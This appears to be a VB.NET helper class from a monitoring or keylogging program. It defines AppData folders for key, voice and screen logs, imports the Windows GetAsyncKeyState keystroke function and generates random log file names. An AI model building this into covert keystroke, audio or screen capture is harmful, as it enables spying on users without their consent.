Imports System.Text
Imports System.Runtime.InteropServices

Public Class IMSS_PATHS
    Public Shared _IMSS_LOGS_DIR As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\IMSS_ALL_LOGS"
    Public Shared _IMSS_KEY_LOGS_DIR As String = _IMSS_LOGS_DIR & "\_IMSS_KEY_LOGS"
    Public Shared _IMSS_VOICE_LOGS_DIR As String = _IMSS_LOGS_DIR & "\_IMSS_VOICE_LOGS"
    Public Shared _IMSS_SCREEN_LOGS_DIR As String = _IMSS_LOGS_DIR & "\_IMSS_SCREEN_LOGS"
    Public Shared _IMSS_EXIT_COMMAND As Boolean = False
    <DllImport("USER32.DLL", EntryPoint:="GetAsyncKeyState", SetLastError:=True,
    CharSet:=CharSet.Unicode, ExactSpelling:=True,
    CallingConvention:=CallingConvention.StdCall)>
    Public Shared Function getkey(ByVal Vkey As Integer) As Boolean
    End Function

    Public Shared Function _IMSS_GenerateRandomFileName()
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To 8
            Dim idx As Integer = r.Next(0, 35)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
End Class
